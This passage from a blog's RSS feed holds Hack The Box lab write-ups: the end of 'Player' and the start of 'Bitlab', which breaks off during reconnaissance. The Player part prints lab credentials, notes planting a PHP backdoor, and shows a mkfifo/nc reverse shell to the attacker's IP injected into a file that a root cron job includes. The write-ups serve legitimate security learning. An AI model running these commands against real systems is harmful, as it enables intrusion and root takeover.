class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">#&gt; .readfile &#x2F;var&#x2F;www&#x2F;staging&#x2F;fix.php                                    </span><br><span class="line">DEBUG:__main__:auth_cookie: &#39;xxxx\nsource &#x2F;var&#x2F;www&#x2F;staging&#x2F;fix.php\n&#39;          </span><br><span class="line">DEBUG:__main__:dummy exec returned: None</span><br><span class="line">INFO:__main__:&lt;?php       </span><br><span class="line">class                            </span><br><span class="line">protected                                          </span><br><span class="line">protected                                      </span><br><span class="line">protected                                      </span><br><span class="line">public                                       </span><br><span class="line">return                                          </span><br><span class="line">&#125;</span><br><span class="line">public</span><br><span class="line">if($result</span><br><span class="line">static::passed($test_name);</span><br><span class="line">&#125;</span><br><span class="line">static::failed($test_name);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">public</span><br><span class="line">if($result</span><br><span class="line">static::failed($test_name);</span><br><span class="line">&#125;</span><br><span class="line">static::passed($test_name);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">public</span><br><span class="line">if(!$username)&#123;</span><br><span class="line">$username</span><br><span class="line">$password</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;modified</span><br><span class="line">&#x2F;&#x2F;for</span><br><span class="line">&#x2F;&#x2F;fix</span><br><span class="line">&#x2F;&#x2F;peter</span><br><span class="line">&#x2F;&#x2F;CQXpm\z)G5D#%S$y&#x3D;</span><br><span class="line">&#125;</span><br><span class="line">public</span><br><span class="line">if($result</span><br><span class="line">static::passed($test_name);</span><br><span class="line">&#125;</span><br><span class="line">static::failed($test_name);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">public</span><br><span class="line">echo</span><br><span class="line">echo</span><br><span class="line">echo</span><br><span class="line">&#125;</span><br><span class="line">private</span><br><span class="line">echo</span><br><span class="line">static::$failed++;</span><br><span class="line">&#125;</span><br><span class="line">private</span><br><span class="line">static::character(&quot;.&quot;);</span><br><span class="line">static::$passed++;</span><br><span class="line">&#125;</span><br><span class="line">private</span><br><span class="line">echo</span><br><span class="line">static::$last_echoed</span><br><span class="line">&#125;</span><br><span class="line">private</span><br><span class="line">if(static::$last_echoed</span><br><span class="line">echo</span><br><span class="line">static::$last_echoed</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">#&gt;</span><br></pre></td></tr></table></figure><p>These credentials (<code>peter : CQXpm\z)G5D#%S$y=</code>) worked with <code>dev.player.htb</code>:<br><img src="/images/hackthebox/player/20.png" alt=""></p><p><img src="/images/hackthebox/player/21.png" alt=""></p><p>I tried to create a new project in <code>/var/www/html</code>:<br><img src="/images/hackthebox/player/22.png" alt=""><br>But I got an error saying that I was only allowed to create projects in <code>/var/www/demo/home</code> so I created a project there:<br><img src="/images/hackthebox/player/23.png" alt=""><br>When I ran <code>gobuster</code> on <code>http://dev.player.htb/</code> there was a directory called <code>home</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;player# gobuster dir -u http:&#x2F;&#x2F;dev.player.htb&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt </span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">[+] Url:            http:&#x2F;&#x2F;dev.player.htb&#x2F;</span><br><span class="line">[+] Threads:        10</span><br><span class="line">[+] Wordlist:       &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster&#x2F;3.0.1</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2020&#x2F;01&#x2F;17 20:18:00 Starting gobuster</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x2F;.hta (Status: 403)</span><br><span class="line">&#x2F;.htpasswd (Status: 403)</span><br><span class="line">&#x2F;.htaccess (Status: 403)</span><br><span class="line">&#x2F;components (Status: 301)</span><br><span class="line">&#x2F;data (Status: 301)</span><br><span class="line">&#x2F;favicon.ico (Status: 200)</span><br><span class="line">&#x2F;home (Status: 301)</span><br><span class="line">&#x2F;index.php (Status: 200)</span><br><span class="line">&#x2F;js (Status: 301)</span><br><span class="line">&#x2F;languages (Status: 301)</span><br><span class="line">&#x2F;lib (Status: 301)</span><br><span class="line">&#x2F;plugins (Status: 301)</span><br><span class="line">&#x2F;server-status (Status: 403)</span><br><span class="line">&#x2F;themes (Status: 301)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2020&#x2F;01&#x2F;17 20:19:49 Finished</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;player#</span><br></pre></td></tr></table></figure><p>I wanted to see if that was related to <code>/var/www/demo/home</code> so I created a file called <code>test.php</code> that echoed <code>test</code> and I tried to access it through <code>/home</code>:<br><img src="/images/hackthebox/player/24.png" alt=""></p><p><img src="/images/hackthebox/player/25.png" alt=""><br>It worked so I edited my test file and added the <code>php-simple-backdoor</code> code and got a reverse shell:<br><img src="/images/hackthebox/player/26.png" alt=""></p><p><img src="/images/hackthebox/player/27.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;player# nc -lvnp 1337</span><br><span class="line">listening on [any] 1337 ...</span><br><span class="line">connect to [10.10.xx.xx] from (UNKNOWN) [10.10.10.145] 56714</span><br><span class="line">&#x2F;bin&#x2F;sh: 0: can&#39;t access tty; job control turned off</span><br><span class="line">$ which python</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line">$ python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;</span><br><span class="line">www-data@player:&#x2F;var&#x2F;www&#x2F;demo&#x2F;home$ ^Z</span><br><span class="line">[1]+  Stopped                 nc -lvnp 1337</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;player# stty raw -echo</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;player# nc -lvnp 1337</span><br><span class="line"></span><br><span class="line">www-data@player:&#x2F;var&#x2F;www&#x2F;demo&#x2F;home$ export TERM&#x3D;screen</span><br><span class="line">www-data@player:&#x2F;var&#x2F;www&#x2F;demo&#x2F;home$ id</span><br><span class="line">uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)</span><br><span class="line">www-data@player:&#x2F;var&#x2F;www&#x2F;demo&#x2F;home$</span><br></pre></td></tr></table></figure><h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><p>when I ran <code>pspy</code> to monitor the processes I noticed that <code>/var/lib/playbuff/buff.php</code> got executed as root periodically:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2020&#x2F;01&#x2F;18 05:25:02 CMD: UID&#x3D;0    PID&#x3D;3650   | &#x2F;usr&#x2F;bin&#x2F;php &#x2F;var&#x2F;lib&#x2F;playbuff&#x2F;buff.php</span><br></pre></td></tr></table></figure><p>I couldn’t write to it but it included another <code>php</code> file which I could write to (<code>/var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php</code>):</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">www-data@player:/tmp$ cd /<span class="keyword">var</span>/lib/playbuff/</span><br><span class="line">www-data@player:/<span class="keyword">var</span>/lib/playbuff$ cat buff.php </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"/var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php"</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">playBuff</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $logFile=<span class="string">"/var/log/playbuff/logs.txt"</span>;</span><br><span class="line">        <span class="keyword">public</span> $logData=<span class="string">"Updated"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                file_put_contents(<span class="keyword">__DIR__</span>.<span class="string">"/"</span>.<span class="keyword">$this</span>-&gt;logFile,<span class="keyword">$this</span>-&gt;logData);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">$buff = <span class="keyword">new</span> playBuff();</span><br><span class="line">$serialbuff = serialize($buff);</span><br><span class="line">$data = file_get_contents(<span class="string">"/var/lib/playbuff/merge.log"</span>);</span><br><span class="line"><span class="keyword">if</span>(unserialize($data))</span><br><span class="line">&#123;</span><br><span class="line">        $update = file_get_contents(<span class="string">"/var/lib/playbuff/logs.txt"</span>);</span><br><span class="line">        $query = mysqli_query($conn, <span class="string">"update stats set status='$update' where id=1"</span>);</span><br><span class="line">        <span class="keyword">if</span>($query)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'Update Success with serialized logs!'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">        file_put_contents(<span class="string">"/var/lib/playbuff/merge.log"</span>,<span class="string">"no issues yet"</span>);</span><br><span class="line">        $update = file_get_contents(<span class="string">"/var/lib/playbuff/logs.txt"</span>);</span><br><span class="line">        $query = mysqli_query($conn, <span class="string">"update stats set status='$update' where id=1"</span>);</span><br><span class="line">        <span class="keyword">if</span>($query)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'Update Success!'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">www-data@player:/<span class="keyword">var</span>/lib/playbuff$</span><br></pre></td></tr></table></figure><p>I put my reverse shell payload in <code>/tmp</code> and added a line to <code>/var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php</code> that executed it:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">www-data@player:&#x2F;$ cat &#x2F;var&#x2F;www&#x2F;html&#x2F;launcher&#x2F;dee8dc8a47256c64630d803a4c40786g.php</span><br><span class="line">&lt;?php</span><br><span class="line">$servername &#x3D; &quot;localhost&quot;;</span><br><span class="line">$username &#x3D; &quot;root&quot;;</span><br><span class="line">$password &#x3D; &quot;&quot;;</span><br><span class="line">$dbname &#x3D; &quot;integrity&quot;;</span><br><span class="line"></span><br><span class="line">system(&quot;bash -c &#x2F;tmp&#x2F;pwned.sh&quot;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Create connection</span><br><span class="line">$conn &#x3D; new mysqli($servername, $username, $password, $dbname);</span><br><span class="line">&#x2F;&#x2F; Check connection</span><br><span class="line">if ($conn-&gt;connect_error) &#123;</span><br><span class="line">    die(&quot;Connection failed: &quot; . $conn-&gt;connect_error);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">www-data@player:&#x2F;$ cat &#x2F;tmp&#x2F;pwned.sh </span><br><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.10.xx.xx 1338 &gt;&#x2F;tmp&#x2F;f</span><br><span class="line">www-data@player:&#x2F;$</span><br></pre></td></tr></table></figure><p><img src="/images/hackthebox/player/28.png" alt=""><br>And we owned root !<br>That’s it , Feedback is appreciated !<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener">@Ahm3d_H3sham</a><br>Thanks for reading.</p><p>Previous Hack The Box write-up : <a href="/hack-the-box/bitlab/">Hack The Box - Bitlab</a><br>Next Hack The Box write-up : <a href="/hack-the-box/ai/">Hack The Box - AI</a></p>]]></content:encoded>
      
      <comments>https://0xrick.github.io/hack-the-box/player/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Hack The Box - Bitlab</title>
      <link>https://0xrick.github.io/hack-the-box/bitlab/</link>
      <guid>https://0xrick.github.io/hack-the-box/bitlab/</guid>
      <pubDate>Sat, 11 Jan 2020 03:00:00 GMT</pubDate>
      <description>
      
        My write-up / walkthrough for Bitlab from Hack The Box.
      
      </description>
      
      
      <content:encoded><![CDATA[<h1 id="Hack-The-Box-Bitlab"><a href="#Hack-The-Box-Bitlab" class="headerlink" title="Hack The Box - Bitlab"></a>Hack The Box - Bitlab</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Hey guys, today Bitlab retired and here’s my write-up about it. It was a nice CTF-style machine that mainly had a direct file upload and a simple reverse engineering challenge. It’s a Linux box and its ip is <code>10.10.10.114</code>, I added it to <code>/etc/hosts</code> as <code>bitlab.htb</code>. Let’s jump right in !</p><p><img src="/images/hackthebox/bitlab/0.png" alt=""></p><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>As always we will start with <code>nmap</code> to scan for open ports and services:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;bitlab# nmap -sV -sT -sC -o nmapinitial bitlab.htb </span><br><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-01-10 13:44 EST</span><br><span class="line">Nmap scan report for bitlab.htb (10.10.10.114)</span><br><span class="line">Host is up (0.14s latency).</span><br><span class="line">Not shown: 998 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 (RSA)</span><br><span class="line">|   256 e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc (ECDSA)</span><br><span class="line">|_  256 c9:54:3d:91:01:78:03:ab:16:14:6b:cc:f0:b7:3a:55 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    nginx</span><br><span class="line">| http-robots.txt: 55 disallowed entries (15 shown)</span><br><span class="line">| &#x2F; &#x2F;autocomplete&#x2F;users &#x2F;search &#x2F;api &#x2F;admin &#x2F;profile </span><br><span class="line">| &#x2F;dashboard &#x2F;projects&#x2F;new &#x2F;groups&#x2F;new &#x2F;groups&#x2F;*&#x2F;edit &#x2F;users &#x2F;help </span><br><span class="line">|_&#x2F;s&#x2F; &#x2F;snippets&#x2F;new &#x2F;snippets&#x2F;*&#x2F;edit</span><br><span class="line">| http-title: Sign in \xC2\xB7 GitLab</span><br><span class="line">|_Requested resource was http:&#x2F;&#x2F;bitlab.htb&#x2F;users&#x2F;sign_in</span><br><span class="line">|_http-trane-info: Problem with XML parsing of &#x2F;evox&#x2F;about</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 31.56 seconds</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;bitlab#</span><br></pre></td></tr></table></figure><p>We got <code>http</code> on port 80 and <code>ssh</code> on port 22, <code>robots.txt</code> existed on the web server and it had a lot of entries.</p><h2 id="Web-Enumeration"><a href="#Web-Enumeration" class="headerlink" title="Web Enumeration"></a>Web Enumeration</h2><p><code>Gitlab</code> was running on the web server and we need credentials:<br><img src="/images/hackthebox/bitlab/1.png" alt=""><br>I checked <code>/robots.txt</code> to see if there was anything interesting:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;bitlab# curl http:&#x2F;&#x2F;bitlab.htb&#x2F;robots.txt                                                                                                                                                             [18&#x2F;43]</span><br><span class="line"># See http:&#x2F;&#x2F;www.robotstxt.org&#x2F;robotstxt.html for documentation on how to use the robots.txt file                                                                                                                                          </span><br><span class="line">#                                                                                                                                                                                                                                          </span><br><span class="line"># To ban all spiders from the entire site uncomment the next two lines:                                                                                                                                                                    </span><br><span class="line"># User-Agent: *                                                                                                                                                                                                                            </span><br><span class="line"># Disallow: &#x2F;                                                                                                                                                                                                                              </span><br><span class="line">                                                                                                                                                                                                                                           </span><br><span class="line"># Add a 1 second delay between successive requests to the same server, limits resources used by crawler                                                                                                                                    </span><br><span class="line"># Only some crawlers respect this setting, e.g. Googlebot does not                                                                                                                                                                         </span><br><span class="line"># Crawl-delay: 1                                                                                                                                                                                                                           </span><br><span class="line">                                                                                                                                                                                                                                           </span><br><span class="line"># Based on details in https:&#x2F;&#x2F;gitlab.com&#x2F;gitlab-org&#x2F;gitlab-ce&#x2F;blob&#x2F;master&#x2F;config&#x2F;routes.rb, https:&#x2F;&#x2F;gitlab.com&#x2F;gitlab-org&#x2F;gitlab-ce&#x2F;blob&#x2F;master&#x2F;spec&#x2F;routing, and using application                                                        </span><br><span class="line">User-Agent: *                                                                                                                                                                                                                              </span><br><span class="line">Disallow: &#x2F;autocomplete&#x2F;users                                                                                                                                                                                                              </span><br><span class="line">Disallow: &#x2F;search                                                                                                                                                                                                                          </span><br><span class="line">Disallow: &#x2F;api                                                                                                                                                                                                                             </span><br><span class="line">Disallow: &#x2F;admin                                                                                                                                                                                                                           </span><br><span class="line">Disallow: &#x2F;profile                                                                                                                                                                                                                         </span><br><span class="line">Disallow: &#x2F;dashboard                                                                                                                                                                                                                       </span><br><span class="line">Disallow: &#x2F;projects&#x2F;new</span><br><span class="line">Disallow: &#x2F;groups&#x2F;new</span><br><span class="line">Disallow: &#x2F;groups&#x2F;*&#x2F;edit</span><br><span class="line">Disallow: &#x2F;users</span><br><span class="line">Disallow: &#x2F;help</span><br><span class="line"># Only specifically allow the Sign In page to avoid very ugly search results</span><br><span class="line">Allow: &#x2F;users&#x2F;sign_in</span><br><span class="line"></span><br><span class="line"># Global snippets</span><br><span class="line">User-Agent: *</span><br><span class="line">Disallow: &#x2F;s&#x2F;</span><br><span class="line">Disallow: &#x2F;snippets&#x2F;new</span><br><span class="line">Disallow: &#x2F;snippets&#x2F;*&#x2F;edit</span><br><span class="line">Disallow: &#x2F;snippets&#x2F;*&#x2F;raw</span><br><span class="line"></span><br><span class="line"># Project details</span><br><span class="line">User-Agent: *</span><br><span class="line">Disallow: 